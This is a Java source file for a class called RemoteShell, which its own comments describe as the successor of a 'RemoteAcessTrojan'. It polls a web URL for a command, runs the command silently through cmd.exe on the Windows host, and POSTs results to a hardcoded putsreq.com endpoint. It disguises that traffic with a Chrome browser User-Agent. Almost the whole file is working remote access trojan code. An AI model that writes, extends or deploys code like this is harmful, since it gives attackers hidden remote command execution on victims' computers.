package com.renks.webrat;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.StringJoiner;
import java.util.Map.Entry;

/**
 * Ancestor of RemoteAcessTrojan.java<br/>
 * Windows version.<br />
 * You might find this class weird or you may think "Why this exists or Why that
 * not? etc."<br />
 * But Class is usable. <br />
 * <br />
 * <b>Update(29'10 2018 15:30): </b>
 * <dd>{@link com.renks.webrat.RemoteShell#writeServerURL writeServerUrl} has
 * been made private. Now either user can pass it in constructor or in
 * method.<br />
 * Commented 'double version' variable has been removed. Commented
 * 'fetchCommand' method from Advanced constructor has been removed.<br />
 * Unnecessary comments have been removed from
 * {@link com.renks.webrat.RemoteShell#executeCommand(boolean)
 * executeCommand(paramDirectCommand)} Some updated javadocs.</dd><br />
 * <b>Predecessor:</b>
 * <dd>RemoteAcessTrojan.java</dd>
 * 
 * @author Renks
 * @version 1.5
 * 
 */
public class RemoteShell {

	// Stage 1
	/**
	 * URL of commands file located on web server.
	 */
	private String fileExecuteURL; // Fetch commands.txt file from this URL, couldn't think of a better name
	/**
	 * Current command to execute.
	 */
	private String commandToExecute; // Command to execute by ProcessBuilder
	/**
	 * Current working directory where command will be executed.
	 */
	private String currentWorkingDir = ""; // cwd used by process builder.directory(new File(String cwd));
	/**
	 * Output generated by the executed command.
	 */
	private String outputOfCommand; // Output of executed command

	// Stage 2
	/*
	 * It's mandatory to have a default writeServerURL in case user didn't provide
	 * one in Constructor.
	 */
	/**
	 * <b>User Info(Outdated javadoc):</b>
	 * <dd>Set this, If you are using
	 * {@link com.renks.webrat.RemoteShell#sendOutputToServer()
	 * <i>sendOutputToServer()</i>} instead of
	 * {@link com.renks.webrat.RemoteShell#sendOutputToServer()
	 * <i>sendOutputToServer(paramServerURL)</i>}.<br />
	 * Otherwise output will be send to default server, which is a dummy post
	 * request tester.</dd>
	 */
	private String writeServerURL = "https://putsreq.com/oOrFWgnNL4ljCR0L0We9";
	// even though we don't need it, but I made it so that user can directly set
	// this instead of creating a variable of their own

	private String method = "POST"; // POST or GET? Default is POST

	// Get the full MIME list: https://www.freeformatter.com/mime-types-list.html
	private String contentType = "application/x-www-form-urlencoded; charset=UTF-8"; // Content-type
																						// setRequestProperty('Content-type',
																						// contentType)

	private String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"; // User
																																						// agent
																																						// of
																																						// request,
																																						// Webkit,
																																						// Mozilla
																																						// ...
	// My userAgent Source:
	// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent/Firefox
	// But then I used my own: https://www.whoishostingthis.com/tools/user-agent/

	private HttpURLConnection httpConn; // Connection, ONLY for sending post requests

	private final HashMap<String, String> arguments = new HashMap<String, String>();

	// Before doing anything else, lets just get the commands file
	/**
	 * Basic Constructor of RemoteShell
	 * 
	 * @param paramfileExecuteURL = URL of txt file located on web server.
	 */
	public RemoteShell(String paramFileExecuteURL) {
		// Obviously if this runs then user didn't provide the Server URL so we pass the
		// default one to the original constructor.
		this(paramFileExecuteURL, "https://putsreq.com/oOrFWgnNL4ljCR0L0We9");
	}

	/**
	 * Advanced Constructor of RemoteShell which takes fileURL and ServerURL<br />
	 * In this Constructor, user can directly set writeServerURL by passing it in
	 * parameters. <br />
	 * 
	 * @param paramfileExecuteURL = URL of txt file located on web server.
	 * @param paramWriteServerURL = URL of Server which takes command's output.
	 */
	public RemoteShell(String paramFileExecuteURL, String paramWriteServerURL) {
		fileExecuteURL = paramFileExecuteURL;
		writeServerURL = paramWriteServerURL;

		// Add a default argument, so that when sending output the server knows its
		// coming from RemoteShell
		arguments.put("Request-From", "Remote_Shell");
	}

	/**
	 * Fetches the commands file from URL and sets the
	 * {@link com.renks.webrat.RemoteShell#commandToExecute commandToExecute} to the
	 * first line in command's file.<br />
	 * You can execute the command by running
	 * {@link com.renks.webrat.RemoteShell#executeCommand() executeCommand()} <br />
	 * <br />
	 * <b>Side Note to myself: </b>Why this exists? Cause User must have already
	 * provided the fileExecuteURL in one of the Constructors, So Why pass it again.
	 * PS: I know I messed this class up.
	 */
	public void fetchCommand() {
		this.fetchCommand(fileExecuteURL);
	}

	private void fetchCommand(String url) {
		try {
			HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection(); // throws IOException

			try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream())); // will be closed
																										// automatically
			) {
				// try block
				this.commandToExecute = br.readLine(); // Reads only the first line of file(commands)
			} catch (Exception e) {
				System.err.println(e.getMessage());
			}
		} catch (Exception e) {
			// e.printStackTrace();
			System.err.println(e.getMessage()); // Print only the error message
		}
	}

	/**
	 * Run command from cmd.exe
	 */
	public void executeCommand() {
		this.executeCommand(getCommand(), false);
	}

	/**
	 * Executes the command just like
	 * {@link com.renks.webrat.RemoteShell#executeCommand() executeCommand()}
	 * However, If paramDirectCommand is true then user will have full control over
	 * the command otherwise command will be executed from cmd. Use
	 * {@link com.renks.webrat.RemoteShell#executeCommand() executeCommand()}
	 * instead if you have no idea what you are doing.
	 * 
	 * @param paramDirectCommand = If true user will have full control over the
	 *                           command, otherwise run it from cmd.exe just like
	 *                           {@link com.renks.webrat.RemoteShell#executeCommand()
	 *                           executeCommand()}
	 */
	public void executeCommand(String cmd, boolean paramDirectCommand) {
		// Prepare the String builder to store the command's output
		StringBuilder sb = new StringBuilder();

		// Execute the command using ProccessBuilder
		ProcessBuilder processBuilder = new ProcessBuilder();

		// If user supplied true, then they have full control otherwise run it from cmd
		if (paramDirectCommand) {
			// But user has to be extra carefull
			processBuilder.command(cmd);
		} else if (!paramDirectCommand) {
			processBuilder.command("cmd.exe", "/c", cmd);
		}

		// Since we are using a method to get the current working directory, its better
		// to handle exception
		// For eg: what if user supplied a non existing directory. Never trust a user
		try {

			// Set the Directory
			if (new File(getCurrentDir()).isDirectory()) {
				processBuilder.directory(new File(getCurrentDir()));
			} else {
				System.err.println(
						getCurrentDir() + " : Directory does not exist, Setting current directory to User's home.");
				processBuilder.directory(new File(System.getProperty("user.home")));
			}
		} catch (Exception e) {
			// e.printStackTrace();
			System.err.println(e.getMessage());
		}

		// Finally execute the command
		try {
			Process process = processBuilder.start();

			// Using BufferedReader to read the output and store it in sb
			new BufferedReader(new InputStreamReader(process.getInputStream())).lines()
					.forEach(i -> sb.append(i + "\r\n")); // Use \n if working with UNIX platform
		} catch (IOException e) {
			// e.printStackTrace();
			System.err.println("Error while executing the command. " + e.getMessage());
		} catch (Exception e) {
			System.err.println(e.getMessage());
		}

		// Return the output of executed command
		this.outputOfCommand = sb.toString();
	}

	/**
	 * Default method to send the executed command's output to server.<br/>
	 * Use this if you have provided the Server/API URL in
	 * {@link com.renks.webrat.RemoteShell#RemoteShell(String, String) Constructor}
	 * 
	 * @return {@link java.io.InputStream InputStream} of output generated by
	 *         server.
	 */
	public InputStream sendOutputToServer() {
		return this.sendOutputToServer(writeServerURL);
	}

	/**
	 * Sends output to the provided URL.
	 * 
	 * @param paramServerURL = Server/API URL or where to send the output.
	 * @return {@link java.io.InputStream InputStream} of output generated by
	 *         server.
	 */
	public InputStream sendOutputToServer(String paramServerURL) {
		try {
			this.httpConn = (HttpURLConnection) new URL(paramServerURL).openConnection();
			httpConn.setRequestMethod(this.getRequestType());
			httpConn.setDoOutput(true);

			StringJoiner sj = new StringJoiner("&");

			for (Entry<String, String> entry : this.arguments.entrySet())
				sj.add(URLEncoder.encode(entry.getKey(), "UTF-8") + "=" + URLEncoder.encode(entry.getValue(), "UTF-8"));
			byte[] out = sj.toString().getBytes(StandardCharsets.UTF_8);
			int length = out.length;

			httpConn.setFixedLengthStreamingMode(length);
			httpConn.setRequestProperty("User-Agent", getUserAgent());
			httpConn.setRequestProperty("Content-Type", getContentType());
			httpConn.connect();

			try (OutputStream os = httpConn.getOutputStream()) {
				os.write(out);
			}

			// Return the output as InputStream
			return httpConn.getInputStream();

		} catch (IOException e) {
			// Change error to getMessage();
			// e.printStackTrace();
			System.err.println(e.getMessage());
			return null;
		}
	}

	// Getters
	public String getCommand() {
		// Side Note: Logic shouldn't be in getters but in setters, cause getters are
		// used repeatedly while setters are only used to set something. FIX IT!
		// And put this logic in executeCommand method.
		if (commandToExecute == null || commandToExecute.equals("") || commandToExecute.isEmpty())
			this.commandToExecute = "echo ERROR_NULL_COMMAND";
		// System.out.println("DEBUG: command:"+ commandToExecute);
		return commandToExecute;
	}

	public String getCurrentDir() {
		// Side Note: logic should be in setters rather than getters, I will fix it
		// later
		if (currentWorkingDir.equalsIgnoreCase("") || currentWorkingDir.isEmpty())
			return System.getProperty("user.home");
		else if (currentWorkingDir.equals("user.home"))
			return System.getProperty("user.home");
		else if (currentWorkingDir.equals("user.dir"))
			return System.getProperty("user.dir");
		else
			return currentWorkingDir;
	}

	public String getCommandOutput() {
		return outputOfCommand;
	}

	/**
	 * Get help about how to run complex commands. BTW this function should be in
	 * Web APP(PHP) which adds the commands to command file.
	 * 
	 * @since RemoteShell v1.2
	 */
	public String getCoolCommands() {
		// Side note: Complete this in Web APP(PHP)
		// String help =
		// org.apache.commons.lang.StringEscapeUtils.escapeJava(yourString);

		// It's kinda like getHelp function but here you learn how to run cool or
		// complex commands. (Still in development)
		return "Run music from vlc minimized:\nE:\\VideoLAN\\VLC\\vlc.exe \"E:\\songzz\\Eminem - Revival - (www.SongsLover.club)\\5. River (feat. Ed Sheeran) - (www.SongsLover.club).mp3\" --qt-start-minimized";
	}

	public String getContentType() {
		return contentType;
		// Check if contentType is illegal
	}

	public String getUserAgent() {
		return userAgent;
		// Check if illegal
	}

	public String getRequestType() {
		return method;
		// Check if illegal
	}

	// Setters
	public void setCurrentDir(String cwd) {
		this.currentWorkingDir = cwd;
	}

	public void setContentType(String paramContentType) {
		this.contentType = paramContentType;
	}

	public void setuserAgent(String paramUserAgent) {
		this.userAgent = paramUserAgent;
	}

	public void setRequestType(String paramMethodType) {
		this.method = paramMethodType;
	}

	public void setArguments(String key, String value) {
		this.arguments.put(key, value);
	}
}
